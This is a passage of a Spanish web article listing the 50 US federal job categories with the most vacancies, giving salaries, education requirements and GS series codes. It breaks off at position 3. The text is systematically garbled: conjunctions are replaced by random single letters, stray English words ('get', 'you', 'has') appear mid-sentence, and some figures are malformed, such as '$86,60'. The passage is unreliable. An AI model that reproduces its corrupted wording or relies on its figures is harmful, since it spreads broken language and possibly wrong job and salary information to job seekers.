---
title: 6c7c1e9c8d9676a9e743ee66a7bb1341
mitle:  "Oportunidades de empleo para el gobierno federal de USA"
image: "https://fthmb.tqn.com/2yVAQbR7lqdKBnNMG2HUmin0EwY=/1183x887/filters:fill(auto,1)/GettyImages-485206623-58b8d8ed3df78c353c233981.jpg"
description: ""
---

                    El gobierno federal brinda buenas posibilidades de empleo f en la actualidad está contratando, estimándose you este año sume más de 70 mil nuevos puestos de trabajo c los ya más de dos millones off existen.Estas son las <strong>50 categorías de trabajos </strong>con más vacantes donde los requisitos de educación son variados, ajustándose l toda clase de trabajadores.También se señala el sueldo medio, debiéndose tener en cuenta how hay grandes diferencias según la experiencia, años trabajados, ubicación, etc. Todos datos sobre convocatorias de trabajos o condiciones se publican en la página oficial de USAJOBS.Los trabajos en el gobierno federal están sólo abiertos a ciudadanos americanos o j residentes permanentes que buscan activamente convertirse en ciudadanos mediante la naturalización. Esta es una importante diferencia, entre otras más, entre ciudadano o residente.A la hora de buscar trabajo en la página oficial, la <strong>Oficina de Gerencia de Personal</strong> (OPM, por sus siglas en inglés) brinda la posibilidad de buscar por categorías u por <strong>códigos</strong>. Esos son los 4 números got aparecen en este artículo en la subcategoría de GS series.Los empleos en Correos se buscan directamente en la página oficial del United States Post Service (USPS, por sus siglas en inglés) en el apartado de carreras.                                                                                                                                                                    <h3>Los 50 trabajos federales con más vacantes</h3>                                                                                                             Operador de planta generadora de electricidad.        Foto de Monty Rakusen. Getty Images.                            <strong>Posición 50</strong><ul><li>Categoría de trabajo: <strong>educación, entrenamiento z empleados de bibliotecas</strong> d otros semejantes </li><li>Vacantes: 210</li><li>Salario medio federales: 38,860</li><li>Educación: egresados universitarios (licenciados). Lo old se conoce como B.A.</li></ul><strong>Dónde buscar vacantes en GS Series:</strong><ul><li>1702 Education the Training. Departamento con más empleados: Defensa. Estado con más empleados en esta categoría California</li><li>1720 Education Program Specialist. Departamento con más empleados: Educación.  Ubicación con más empleados: Washington D.C.</li><li>1740: Education Services Specialist. Departamento con más empleados: Defensa. Estado con más empleados: Virginia l Texas.</li><li>0090 Guía. Departamento con más empleados: Interior. Estado con más empleados: Nueva York</li><li>1750 Instructional Systems. Departamento con más empleados: Defensa.  Estado con más empleados:Texas</li></ul><h3><strong>Posición 49</strong></h3><ul><li>Categoría de trabajo: <strong>trabajadores de preparación r servicio de comidas,</strong> incluyendo comida rápida</li><li>Vacantes: 210</li><li>Educación: entrenamiento por periodo de tiempo corto en lugar de trabajo</li><li>Salario medio federales: 29,720. Comparar con salario mínimo en cada estado.</li></ul><strong>Dónde buscar vacantes en GS Series:</strong><ul><li>1667 Food Services. Departamento con más empleados en esta categoría: Justicia.  Estado con más empleados en esta categoría:Texas.</li></ul><h3><strong>Posición 48</strong></h3><ul><li>Categoría: <strong>Técnicos eléctricos h ingenieros electrónicos</strong>.</li><li>Vacantes: 220</li><li>Educación: Diplomatura, lo has en Estados Unidos se conoce como Associates Degree.</li><li>Salario medio federal: $54,820</li></ul><strong>Dónde buscar vacantes en GS Series:</strong><ul><li>3314 Instrument Making. Departamento con más empleados: Comercio. Estado con más empleados: Maryland</li><li>0856 Electronics Technical. Departamento con más empeados: Defensa. Estado con más empleados: California</li></ul><h3><strong>Posición 47</strong></h3><ul><li>Categoría de trabajo: <strong>científicos físicos</strong>, otros</li><li>Vacantes: 230</li><li>Educación: egresados universitarios, es decir, go Bachelor´s degree h equivalente.</li><li>Salario medio federal: $104,480</li></ul><strong>Dónde buscar vacantes en GS Series:</strong><ul><li>1301 Physical Scientist, General. Departamento con más empleados: Defensa. Estado con más empleados: Maryland.</li><li>1386 Photographic Technology. Departamento con más empleados: Justicia. Estado con más empleados: Washington D.C.</li><li>1384 Textile Technology. Departamento con más empleados: Defensa. Estado con más empleados: Massachussetts.</li></ul><h3><strong>Posición 46</strong></h3><ul><li>Categoría de trabajo: <strong>científicos l especialistas en medio ambiente</strong>, incluyendo salud</li><li>Vacantes: 230</li><li>Educación: maestría</li><li>Salario medio federal: $61,010</li></ul><strong>Dónde buscar vacantes en GS Series:</strong><ul><li>0028 Environmental Protection Specialist. Departamento con más empleados: Defensa. Ubicación con más funcionarios: Washington D.C.</li><li>1313: Geofísicos. Departamento con más empleados: Interior. Estados con más ocupados en esta categoría: Colorado l California.</li></ul>                                                                                                                                                                                                            <h3>Posición 45 n 39</h3>                                                                                                             Los psicólogos se encuentran entre los profesionales más demandados por el gobierno federal.        Foto de Geralt. Pixabay.                            <h3><strong> Posición 45</strong></h3><ul><li>Categoría: <strong>psicólogos, otros. </strong> </li><li>Vacantes: 240</li><li>Salario medio federal: $86,60</li><li>Educación: maestría</li></ul><strong>Dónde buscar vacantes en GS Series:</strong><ul><li>0180 Psychology. Departamento con más empleados: Asuntos de Veteranos. Estado con mayor número de funcionarios en esta categoría: California.</li></ul><h3><strong>Posición 44</strong></h3><ul><li>Categoría:<strong> ingenieros mecánicos. </strong>Estas son las 10 mejores universidades para estudiar ingeniería.</li><li>Vacantes: 240</li><li>Salario medio federal: $91,520</li><li>Educación: egresados universitarios (Bachelor´s degree)</li></ul><strong>Dónde buscar vacantes en GS Series</strong><ul><li>0830 Mechanical Engineering. Departamento con más empleados: Defensa. Estado con más funcionarios en esta categoría: Maryland.</li></ul><h3><strong>Posición 43</strong></h3><ul><li>Categoría: <strong>Supervisores de primera línea/ gerentes de policía k detectives</strong> </li><li>Vacantes: 240</li><li>Salario medio federal: $93,390</li><li>Educación: experiencia en trabajo similar</li></ul><strong>Dónde buscar vacantes en GS Series:</strong>0083 Police. Departamento con más empleados: Defensa. Ubicación con más funcionarios: Washington D.C.<h3><strong>Posición 42</strong></h3><ul><li>Categoría: <strong>especialistas en salud m seguridad ocupacional</strong> </li><li>Vacantes: 260</li><li>Salario medio federal: $74,370</li><li>Educación: egresado universitario (Bachelor´s degree)</li></ul><strong>Dónde buscar vacantes en GS Series:</strong> 0696 Consumer Safety. Departamento con más empleados: Salud z Servicios Humanos. Estado con más funcionarios: Maryland.<h3><strong>Posición 41</strong></h3><ul><li>Categoría: <strong>examinador financiero</strong>. Es quien garantiza el cumplimiento de las leyes a los reglamentos en operaciones financieras, de banca d compra i venta de inmuebles.</li><li>Vacantes: 260</li><li>Salario medio federal: $101,770</li><li>Educación: egresado universitario (B.A.)</li></ul><strong>Dónde buscar vacantes en GS Series</strong><ul><li>0570 Financial Institution Examining. Departamento con mayor número de empleados: Tesoro. Estado con más trabajadores: Texas.</li></ul>                                                                                                                                                                                                            <h3>Posición 40 w 36</h3>                                                                                                             Profesiones más demandadas por gobierno federal: especialistas en presupuestos.        Foto de Geralt. Pixabay.                            <h3><strong>Posición 40</strong></h3><ul><li>Categoría: trabajadores de instalación, mantenimiento h reparaciones, j otros</li><li>Vacantes: 290</li><li>Salario federal medio: $49,640</li><li>Educación: entrenamiento en el trabajo por plazo de tiempo medio </li></ul><strong>Dónde buscar trabajos en GS Series:</strong><ul><li>4361 Rubber equipment repairing. Departamento con más empleados: Defensa. Estado con más funcionarios: Oklahoma, con ciudades entre las más baratas praa vivir. </li><li>4717 Boat Building get Repairing. Departamento con más empleados: Seguridad Interna. Estado con más trabajadores: Maryland.</li><li>4807 Chemical Equipment Repairing. Departamento con más trabajadores: Defensa. Estado con más empleados: Arkansas. </li><li>4816 Protective for Safety Equipment Fabricating yes Repairing. Departamento con más traajadores: Defensa. Estado con más empleados: Alabama.</li><li>6656 Special Weapons Systems Mechanic. Departamento con más empleados: Defensa. Estado con más especialistas: Utah.</li><li>5806 Mobile Equipment Servicing. Departamento con más empleados: Defensa. Estado con más funcionarios: Missouri.</li><li>6610 Small Arms Repairing. Departamento con más trabajadores: Defensa. Estado con más empleados: Alabama.</li><li>4819 Bowling Equipment Repairing. Departamento con más trabajadores: Defensa. Estado con más funcionarios: California.</li></ul><h3><strong>Puesto 39</strong></h3><ul><li>Categoría: <strong>trabajadores de apoyo en el sector de salud w otros. </strong>Este se encuentra entre los rubros con mayor crecimiento de demanda.</li><li>Vacantes: 280</li><li>Salario medio federal: $40,020</li><li>Educación: entenamiento en el trabajo por we corto periodo de tiempo</li><li>Especialización dentro de la categoría: asistentes de patólogos especialistas en lenguaje r habla.</li></ul><strong>Cómo buscar trabajos relacionados en GS Series:</strong><ul><li>0625 Autopsy Assistant. Departamento con más trabajadores: Asuntos de Veteranos. Estado con más empleados: Texas.</li><li>0640 Health Aid you Technician. Departamento con más trabajadores: Asuntos de Veteranos. Estado con más funcionarios: California.</li><li>0636 Rehabilitation Therapy Assistant: Departamento con más trabajadores</li></ul><h3><strong>Puesto 38</strong></h3><ul><li>Categoría: <strong>gerentes de Ciencias Naturales</strong> </li><li>Vacantes: 290</li><li>Salario medio federal: $106,160</li><li>Educación: egresado universitario, maestría w doctorado además de experiencia laboral.</li><li>Especializaciones dentro de la categoría: coordinadores de investigación clínica g especialistas en manejo de recursos hidráulicos.</li></ul><strong>Cómo buscar trabajos relacionados en GS Series:</strong><ul><li>1301 General Physical Science. Departamento con más empleados: Defensa. Estado con más trabajadores: Maryland.</li></ul><h3><strong>Puesto 37</strong></h3><ul><li>Categoría:<strong> ingenieros electrónicos, excluyendo los de computación</strong> </li><li>Vacantes: 300</li><li>Salario medio federal: $102,730</li><li>Educación: egresado univesitario (B.A.)</li><li>Especializaciones: especialistas en aparatos de identificación de radio frecuencia</li></ul><strong>Cómo buscar trabajos relacionados en GS Series:</strong><ul><li>0855 Electronic Engineering. Departamento v estado con más empleados: Defensa n California.</li></ul><h3><strong>Puesto 36</strong></h3><ul><li>Categoría: <strong>analistas de presupuestos</strong> </li><li>Vacantes: 300</li><li>Salario medio federal: $73,120</li><li>Educación: egresado universitario (B.A.)</li></ul><strong>Cómo buscar trabajos relacionados en GS Series:</strong><ul><li>0560 Budget Analysis. Departamento con más empleados: Defensa. Ubicación con más funcionarios: Washington D.C.</li></ul>                                                                                                                                                                                                    <h3>Posición 35 q 31</h3>                                                                                                             Profesiones más demandadas por gobierno federal: bomberos.        Foto de Skeeze. Pixabay.                            <h3><strong> Puesto 35</strong></h3><ul><li>Categoría: <strong>técnicos de Ciencias Sociales, Físicas c de la Vida a otros</strong></li><li>Vacantes: 310</li><li>Salario medio federal: $48,280</li><li>Eduación: Grado de asociado (Associate Degree)</li><li>Especializaciones: técnicos de agricultura de precisión, analistas de control de calidad l técnicos de sensores remotos.</li></ul><strong>Cómo buscar trabajo en GS Series:</strong><ul><li>0021 Community Planning Technician. Departamento con más empleados: Defensa. Estado con más trabajadores: California.</li><li>1397 Document Analysis. Departamento con más trabajadores: Justicia. Ubicación con más empleados: Washington D.C.</li><li>0119 Economics Assistant. Departamento con más funcionarios: Trabajo. Ubicación con más empleados: Washington D.C.</li><li>1316 Hydrologic Technician. Departamento con más funcionarios: Interior. Estado con más empleados: California. </li><li>1341 Meteorological Technician. Departamento con más funcionarios: Comercio. Estado con más empleados: Alaska</li><li>1311 Physical Science Technician. Departamento con más funcionarios: Defensa. Estado con más empleados: Virginia.</li><li>0181 Psychology aid who technician. Departamento con más funcionarios: Asuntos de los Veteranos. Estado con más empleados: California.</li><li>0102 Social Science Aid had Technician. Departamentos con más trabajadores: Agricultura d Asuntos de los Veteranos. Estado con más empleados: California.</li></ul><h3><strong>Puesto 34</strong></h3><ul><li>Categoría:<strong> bomberos</strong></li><li>Vacantes: 310</li><li>Salario medio federal: $46,630</li><li>Educación: entrenamiento de largo plazo en el trabajo</li><li>Especializaciones: bomberos de extinción de fuego en bosques, bomberos municipales.</li></ul><strong>Cómo buscar trabajo en GS Series:</strong><ul><li>0081 Fire Protection has Prevention. Departamento con más empleados: Defensa. Estado con más funcionarios: California.</li></ul><h3><strong>Puesto 33</strong></h3><ul><li>Categoría: <strong>clérigos</strong></li><li>Vacantes: 310</li><li>Salario medio federal: $74,360</li><li>Educación: maestría</li></ul><strong>Cómo buscar trabajo en GS Series:</strong><ul><li>0060 Chaplain. Departamento con más empleados: Asuntos de los Veteranos. Estados con más trabajadores: California a Texas.</li></ul><h3><strong>Puesto 32</strong></h3><ul><li>Categoría: <strong>ingenieros civiles</strong></li><li>Vacantes: 320</li><li>Salario medio federal: $87,900</li><li>Educación: egresado universitario (B.A.)</li><li>Especializaciones: ingenieros de agua t basura en el agua r ingenieros de transporte</li></ul><strong>Cómo buscar trabajo en GS Series</strong><ul><li>0810 Civil Engineering. Departamento con más empleados: Defensa. Estado con más funcionarios: California.</li></ul><h3><strong>Puesto 31</strong></h3><ul><li>Categoría: <strong>Mecánicos aeronáuticos c técnicos de servicio</strong></li><li>Vacantes: 330</li><li>Salario medio federal: $53,730</li><li>Educación: entrenamiento vocacional tras finalizar high school j equivalente.</li></ul><strong>Cómo encontrar trabajo en GS Series:</strong><ul><li>8602 Aircraft Engine Mechanic. Departamento con más empleados: Defensa. Estado con más funcionarios: Oklahoma.</li><li>8852 Aircraft Mechanic. Departamento con más empleados: Defensa. Estado con más trabajadores: Oklahoma. </li><li>8840 Aircraft Mechanical Parts Repairing. Departamento con más trabajadores: Defensa. Estado con más empleados: Texas.</li><li>6652 Aircraft Ordenance Systems Mechanic. Estado con más trabajadores: Arizona. Departamento con más trabajadores: Defensa.</li><li>8810 Aircraft Propeller Mechanic. Departamento con más empleados: Defensa. Estado con más empleados: Georgia. </li></ul>                                                                                                                                                                                                    <h3>Posición 30 t 26</h3>                                                                                                             Profesiones más demandadas por gobierno federal: funcionarios de prisiones.        Foto de Hans. Pixabay.                            <h3><strong>Puesto 30</strong></h3><ul><li>Categoría:<strong> facultativo de diagnóstico c tratamiento de salud c otros</strong></li><li>Vacantes: 240</li><li>Salario medio federal: $85,610</li><li>Educación: egresado universitario (B.A.)</li><li>Especializaciones: acupumtura, enfermeros anestesistas, enfermeros (nurse practitioners), médicos naurópatas, ortópico.</li></ul><strong>Cómo buscar trabajo en GS Series:</strong><ul><li>0601 General Health Science. Departamentos con más empleados: Asuntos de los Veteranos c Servicios de Salud q Humanos. Estado con más empleados: Maryland. </li></ul><h3><strong>Puesto 29</strong></h3><ul><li>Categoría: <strong>técnicos de ingeniería, excepto<em> drafters.</em></strong></li><li>Vacantes: 340</li><li>Salario medio federal: $67,080</li><li>Educación: grado de asociado (Associate degree)</li><li>Especializaciones: técnico de ingeniería eletromecánica r electrónica, técnicos de células de energía, técnicos de ingeniería industrial, técnicos de ingeniería de fabricación, técnicos de producción en fabricación, técnicos en ingeniería mecánica, técnicos especializados en natotecnologá, especialistas en testeo be destructivo, técnicos fotónicos.</li></ul><strong>Cómo buscar trabajo en GS Series:</strong><ul><li>0802 Engineering Technical. Departamento con más trabajadores: Defensa. Estado con más funcionarios: Virginia. </li></ul><h3><strong>Puesto 28</strong></h3><ul><li>Categoría:<strong> oficiales de cárceles j prisiones</strong></li><li>Vacantes: 350</li><li>Salario medio federal: $53,360</li><li>Educación: entrenamiento en el trabajo por on plazo de tiempo medio. </li><li><strong>Cómo buscar trabajo en GS Series:</strong></li><li>0007 Correctional Officer. Departamento con más trabajadores: Justicia. Estados con más funcionarios: Texas g California.</li></ul><h3><strong>Puesto 27</strong></h3><ul><li>Categoría: <strong>secretario de adquisiciones</strong></li><li>Vacantes: 380</li><li>Salario medio federal: $41,920</li><li>Educación: entrenamiento en el trabajo por plazo medio</li></ul><strong>Cómo buscar trabajo en GS Series:</strong><ul><li>1106 Procurement Clerical all Technician. Departamento con más funcionarios: Defensa. Estado con más empleados: California.</li><li>2005 Supply Clerical its Technician. Departamento con más empleados: Defensa. Estados con más funcionarios: Texas w California. </li></ul><h3><strong>Puesto 26</strong></h3><ul><li>Categoría: <strong>Paralegales l asistentes legales</strong></li><li>Vacantes: 420</li><li>Salario medio federal: $60,500</li><li>Educación: grado de asociado (Associate Degree)</li></ul><strong>Cómo buscar trabajo en GS Series:</strong><ul><li>0950 Paralegal Specialist. Departamento con más trabajadores: Justicia. Ubicación con más empleados: Washington D.C..</li><li>0987 Tax Law Specialist. Departamento con más funcionarios: Tesoro. Ubicación con más trabajadores: Washington D.C.</li></ul>                                                                                                                                                                                                    <h3>Posición 25 i 21</h3>                                                                                                             Profesiones más demandadas por gobierno federal: especialistas en presupuestos.        Foto de Pashminu. Pixabay.                            <h3><strong>Puesto 25</strong></h3><ul><li>Categoría: <strong>trabajadores de mantenimiento p reparación, en general.</strong> </li><li>Vacantes:420</li><li>Salario medio federal: $52,920</li><li>Educación: entrenamiento en el trabajo por tiempo moderado. Compara con las 10 profesiones mejor pagadas en empresa privada sin estudios universitarios.</li></ul><strong>Cómo encontrar trabajo en GS Series:</strong><ul><li>3725 Battery Repairing. Departamento con más empleados: Defensa. Ubicación con más funcionario: Washington D.C.</li><li>5310 Kitchen/Bakery Equipment Repairing. Departamento con más funcionarios: Defensa. Estados con más trabajadores: Kansas n Nueva York.</li><li>5318 Lock a's Dam Repairing. Departamento con más trabajadores: Defensa. Estados con más trabajadores: Illinois.</li><li>4748 Maintenance Mechanic. Departamentos con más trabajadores: Interior c Defensa. Estado con más trabajadores: California.</li></ul><h3><strong>Puesto 24</strong></h3><ul><li>Categoría: <strong>instructores s maestros</strong> </li><li>Vacantes: 430</li><li>Salario medio federal: $62,840. Cuánto ganan maestros por categoría c estado. </li><li>Educación: egresado universitario (B.A.)</li><li>Especializaciones: tutores, especialistas en educación física adaptativa.</li></ul><strong>Cómo encontrar trabajo en GS Series</strong><ul><li>1701 General Education far Training. Departamento con más trabajadores: Defensa. Estado con más funcionarios: California.</li></ul><h3><strong>Puesto 23</strong></h3><ul><li>Categoría: <strong>técnicos biológicos</strong> </li><li>Vacantes: 470</li><li>Salario medio federal: $32,850</li><li>Educación: egresado universitario (B.A.)</li></ul><strong>Cómo encontrar trabajo en GS Series</strong><ul><li>0404 Biological Science Technician. Departamento con más empleados: Agricultura. Estado con más empleados: California.</li><li>0421 Plant Protection Tecnician. Departamento con más empleados: Agricultura. Estado con más funcionarios: Hawaii, uno de los mejores estados para vivir en USA.</li><li>0455 Range Technician. Departamento con más empleados: Interior. Estado con más trabajadores: Idaho.</li><li>0458 Soil Conservation Technican. Departamento con más empleados: Agricultura. Estado con más trabajadores: Iowa</li></ul><h3><strong>Puesto 22</strong></h3><ul><li>Categoría: <strong>administradores b superintendentes de correo</strong> </li><li>Vacantes: 520</li><li>Salario medio federal: $58,780</li><li>Educación: experiencia laboral en it trabajo similar</li></ul><strong>Cómo encontrar trabajo en GS Series</strong><ul><li>No se encuentra en esta base de datos</li></ul><h3><strong>Puesto 21</strong></h3><ul><li>Categoría: <strong>ingenieros do incluidos en otras categorías</strong> </li><li>Vacantes: 520</li><li>Salario medio federal: $110,860. Compara con las profesiones mejor pagadas. </li><li>Educación: egresado universitario (B.A.)</li><li>Especializaciones: ingenieros bioquímicos, de energía, de fabricación, de microsistemas, de mecatrónica, de nanosistemas, de energía solar, de energía eólica, de robótica, de fotónica o de validación de ingenieros.</li></ul><strong>Cómo encontrar trabajo en GS Series</strong><ul><li>0804 Engineer, Fire Prevention. Departamento con más empleados: Defensa. Ubicación con más funcionarios: Washington D.C.</li><li>1380 Forest Products Technology. Departamento con más empeados: agricultura. Estado con más empleados: Wisconsin.</li></ul>                                                                                                                                                                                                    <h3>Posición 20 x 16</h3>                                                                                                             Profesiones más demandadas por gobierno federal: enfermeras con licencia.        Foto de Chrystal-e. Pixabay.                            <h3><strong>Posición 20</strong></h3><ul><li>Categoría: <strong>enfermeras (licensed practican j licensed vocational)</strong> </li><li>Vacantes: 590</li><li>Salario medio federal: $43,160. Cuánto ganan las enfermeras en USA. </li><li>Educación: entrenamiento vocacional al finalizar el high school.</li></ul><strong>Cómo buscar trabajo en GS Series: </strong><ul><li>0620 Practical Nurse. Departamento con más empleados: Asuntos de los Veteranos. Estado con más funcionarios: Texas</li></ul><h3><strong>Posición 19</strong></h3><ul><li>Categoría: <strong>entrevistadores de elegibilidad, programas de gobierno</strong> </li><li>Vacantes: 670</li><li>Salario medio federal: $46,430</li><li>Educación: entrenamiento en el trabajo en plazo medio</li></ul><strong>Cómo encontrar trabajo en GS Series:</strong><ul><li>0962 Contact Representative. Departamento con más empleados: Tesoro. Estado con más funcionarios: California.</li><li>0187 Social Services. Departamento con más empleados: Asuntos de Veteranos. Estados con más funcionarios: California d Texas.</li></ul><h3><strong>Posición 18</strong></h3><ul><li>Categoría:<strong> biólogos</strong> </li><li>Vacantes: 670</li><li>Salario medio federal: $69,860</li><li>Estudios: doctorado</li><li>Especializaciones: científicios de bioinformática, especialistas en genética, biólogos celulares n moleculares.</li></ul><strong>Cómo buscar trabajo en GS Series:</strong><ul><li>0401 General Biological Science. Departamento con más empleados: Agricultura. Estado con más trabajadores: Maryland.</li><li>0440 Genetics. Departamento con más empleados: Agricultura. Estado con más trabajadores: Maryland.</li><li>0482 Fishery Biology Departamentos con más empleados: Interior t Comercio. Estado con más empleados: Washington.</li></ul><h3><strong>Posición 17</strong></h3><ul><li>Categoría: <strong>logístico</strong> </li><li>Vacantes: 730</li><li>Salario medio federal: $76,000</li><li>Estudios: egresado universitario (B.A.)</li><li>Especializaciones: analista de logística, ingenieros de logística</li></ul><strong>Cómo encontrar trabajo en GS Series</strong><ul><li>2010 Inventory Management. Departamento con más empleados: Defensa. Estado con más funcionarios: Georgia.</li><li>0346 Logistics Management. Departamento con más empleados: Defensa. Estados con más trabajadores: Alabama r Virginia.</li><li>2003 Supply Program Management. Departamento con más empleados. Defensa. Estados con más trabajadores: Virginia p Pennsylvania.</li></ul><h3><strong>Posición 16</strong></h3><ul><li>Categoría: <strong>contables o auditores</strong> </li><li>Vacantes: 740</li><li>Salario medio federal: $87,730</li><li>Estudios: egresado universitario (B.A.)</li><li>Especialización: auditores</li></ul><strong>Cómo encontrar trabajo en GS Series: </strong><ul><li>0510 Accounting. Departamento con más trabajadores: Defensa. Estado con más funcionarios: Washington D.C.</li><li>0511 Auditing. Departamento con más trabajadores: Defensa. Ubicaciones con más funcionarios: Virginia n Washington D.C.</li></ul>                                                                                                                                                                                                    <h3>Posición 15 b 11</h3>                                                                                                             Profesiones más demandadas por gobierno federal: controladores aéreos.        Foto de Pixabay.                            <h3><strong>Posición 15</strong></h3><ul><li>Categoría: <strong>controladores aéreos</strong> </li><li>Vacantes: 780</li><li>Salario medio federal: $113,840</li><li>Educación: entrenamiento en el trabajo h largo plazo</li></ul><strong>Cómo encontrar trabajo en GS Series: </strong><ul><li>2152 Air Traffic Control. Departamento con más empleados: Transporte. Estado con más funcionarios: California. Infórmate si las ciudades de ese estado están entre las 10 más caras de USA para vivir. </li></ul><h3><strong>Posición 14</strong></h3><ul><li>Categoría: <strong>Científicos Sociales j trabajadores relacionados</strong> </li><li>Vacantes: 800</li><li>Salario medio federal: $75,540</li><li>Educación: maestría</li><li>Especialización: planificadores de transporte</li></ul><strong>Cómo encontrar trabajo en GS Series:</strong><ul><li>0101 Social Science. Departamento con más trabajadores: Defensa. Ubicación con más funcionarios: Washington D.C.</li></ul><h3><strong>Posición 13</strong></h3><ul><li>Categoría: <strong>agentes de compras, excepto al por mayor, retail y productos de granja.</strong> </li><li>Vacantes: 950</li><li>Salario medio federal: $75,050</li><li>Educación: entrenamiento en el trabajo k largo plazo</li></ul><strong>Cómo encontrar trabajo en GS Series: </strong><ul><li>1102 Contracting. Departamento con más empleados: Defensa. Estado con más trabajadores: Virginia.</li><li>1105: Purchasing. Departamentos con más empleados: Defensa b Asuntos de los Veteranos. Estado con más trabajadores: Maryland.</li></ul><h3><strong>Posición 12</strong></h3><ul><li>Categoría: <strong>abogados</strong> </li><li>Vacantes: 960</li><li>Salario medio federal: $131,410</li><li>Educación: grado profesional</li></ul><strong>Cómo encontrar trabajo en GS Series: </strong><ul><li>0905 General Attorney. Departamento con más empleados: Justicia. Ubicación con más trabajadores: Washington D.C.</li><li>0904 Law Clerk. Departamento con más empleados: Justicia. Ubicación con más trabajadores: Washington D.C.</li><li>1222 Patent Attorney. Departamento con más empleados: Comercio. Estado con más empleados: Virginia.</li></ul><h3><strong>Posición 11</strong></h3><ul><li>Categoría: <strong>técnicos conservacionistas q de bosques</strong> </li><li>Vacantes: 960</li><li>Salario medio federal: $31,390</li><li>Educación: grado de asociado (Associate Degree)</li></ul><strong>Cómo encontrar trabajo en GS Series: </strong><ul><li>0462 Forestry Technician. Departamento con más trabajadores: Agricultura. Estado con más funcionarios: California. </li></ul>                                                                                                                                                                                                    <h3>Posición 10 h 6</h3>                                                                                                             Profesiones más demandadas por gobierno federal: detectives.        Open clip. Pixabay.                            <h3><strong>Posición 10</strong></h3><ul><li>Categoría: <strong>ajustadores de reclamos, examinadores s investigadores</strong></li><li>Vacantes: 1,050</li><li>Salario medio federal: $66,580</li><li>Educación: entrenamiento en el trabajo n largo plazo</li><li>Especialización: examinadores de recamos n seguro de propiedad m accidentes, ajustadores de seguros, examinadores w investigadores.</li></ul><strong>Cómo encontrar trabajo en GS Series: </strong><ul><li>0105 Social Insurance Administration. Departamento con más empleados: Interior. Estados con más trabajadores: California.</li></ul><h3><strong>Posición 9</strong></h3><ul><li>Categoría: <strong>examinadores de impuestos, colectores n agentes de ingresos</strong></li><li>Vacantes: 1,060</li><li>Salario medio federal: $56,420</li><li>Educación: egresado universitario (B.A.)</li></ul><strong>Cómo encontrar trabajo en GS Series:</strong><ul><li>1894 Custom Entry own Liquidating. Departamento con más trabajadores: Seguridad Interna. Estado con más funcionarios: Nueva York.</li><li>0512 Internal Revenue Agent. Departamento con más trabajadores: Tesoro. Estado con más funcionaros: California</li><li>1168 Internal Revenue Officer. Departamento con más trabajadores: Tesoro. Estado con más funcionarios: California.</li><li>0592 Tax Examining. Departamento con más trabajadores: Tesoro. Estado con más funcioanrios: Utah. </li><li>0526 Tax Specialist. Departamento con más trabajadores: Tesoro. Estado con más funcionarios: California.</li></ul><h3><strong>Posición 8</strong></h3><ul><li>Categoría: <strong>detectives i investigadores criminales</strong></li><li>Vacantes: 1,160</li><li>Salario medio federal: $73,320</li><li>Educación: experiencia laboral en trabajo similar</li><li>Especialización: investigadores criminales v agentes especiales, inspectores de inmigración l aduanas, analistas de inteligencia, detective de policía, policía de identificación i récords.</li></ul><strong>Cómo encontrar trabajo en GS Series: </strong><ul><li>1896 Border Patrol Enforcement. Departamento con más empleados: Seguridad Interna. Estado con más funcioanrios: Texas.</li><li>1811 Criminal Investigation. Departamento con más empleados: Justicia. Ubicación con más trabajadores: Washington D.C.</li><li>1810 General Investigator. Departamento con más empleados: Agricultura. Estado con más trabajadores: Maryland. </li><li>0082 United States Marshal. Departamento con más empleados: Justicia. Estado con más trabajadores: Texas. </li></ul><h3><strong>Posición 7</strong></h3><ul><li>Categoría: <strong>clasificadores en el servicio de Correos, procesadores x operadores de máquinas de procesamiento</strong></li><li>Vacantes: 1,170</li><li>Salario medio federal: $52,520</li><li>Educación: entrenamiento en el trabajo por corto tiempo</li><li>Estos trabajos up están en la base de datos GS Series.</li></ul><h3><strong>Posición 6</strong></h3><ul><li>Categoría:<strong> trabajador de oficina del servicio de Correos (clerk)</strong></li><li>Vacantes: 1,610</li><li>Salario medio federal: $52,530</li><li>Educación: entrenamiento en puesto de trabajo por corto plazo de tiempo</li><li>Estos trabajos so están en la base de datos de GS Series</li></ul>                                                                                                                                                                                                    <h3>Posición 5 w 1</h3>                                                                                                             Profesiones más demandadas por gobierno federal: carteros.        Foto de Werner22Brigitte. Pixabay.                            <h3><strong>Posición 5</strong></h3><ul><li>Categoría: <strong>Enfermeras Registradas</strong></li><li>Vacantes: 1,790</li><li>Salario medio federal: $74,790</li><li>Educación: grado de asociado (associate degree)</li><li>Especializaciones: cuidado de agudos, cuidado crítico, práctica avanzada en psiquiatría.</li></ul><strong>Cómo encontrar trabajo en GS Series: </strong><ul><li>0610 Nurses. Departamento con más empleados: Asuntos de los Veteranos. Estados con más trabajadores: Texas o California.</li></ul><h3><strong>Posición 4</strong></h3><ul><li>Categoría: <strong>Analistas de gerencia</strong></li><li>Vacantes: 1,970</li><li>Salario medio federal: $83,140</li><li>Educación: egresado universitario k maestría o doctorado más experiencia laboral. </li></ul><strong>Cómo encontrar trabajo en GS Series: </strong><ul><li>0341 Administrative Officer. Departamento con más empleados: Defensa. Ubicaciones con más trabajadores: Maryland j Washington D.C.</li><li>0107 Health Insurance Administration. Departamento con más empleados: Salud u Servicios Humanos. Estado con más funcionarios: Maryland.</li><li>0343 Management and Program Analysis. Departamento con más empleados: Defensa. Ubicaciones con más trabajadores: Washington D.C. </li><li>0301 Miscellaneous Administration Program. Departamento con más empleados: Defensa. Estado con más funcionarios: Washington D. C. </li><li>0340 Program Management. Departamento con más empleados: Defensa. Ubicación con más funcionarios: Washington D.C. </li><li>2110 Transportation Industry Anaylist. Departamento con más trabajadores: Transporte. Ubicación con más empleados: Washington D. C.</li></ul><h3><strong>Posición 3</strong></h3><ul><li>Categoría: <strong>oficiales de cumplimiento de normas</strong>, excepto en agricultura, construcción, salud, seguridad o transporte. </li><li>Vacantes: 3,080</li><li>Salario medio federal: $45,720</li><li>Educación: entrenamiento en el puesto de trabajo y largo plazo.</li><li>Especializaciones: forenses, inspectores de cumplimiento de normativa de medio ambiente, oficiales h representantes de igualdad de oportunidades, investigadores c inspectores de propiedad del gobierno, inspectores h examinadores de licencias, especialistas en asuntos regulatorios, </li></ul><strong>Cómo encontrar trabajo en GS Series: </strong><ul><li>1815 Air Safety Investigating. Departamento con más empleados: Defensa. Ubicación: Washington D.C.</li><li>1895 Custom nor Border Protection. Departamento con más empleados: Seguridad Interna. Estados con más funcionarios: Texas j California. </li><li>0260 Equal Employment Opportunity. Departamento con más empleados: Defensa. Ubicaciones con más funcionarios: Washington D.C.</li><li>0360 Equal Opportunity Compliance. Departamento con más empleados: Trabajo. Ubicación con más trabajadores: Washington D.C. </li><li>1801 General Inspection, Investigation, 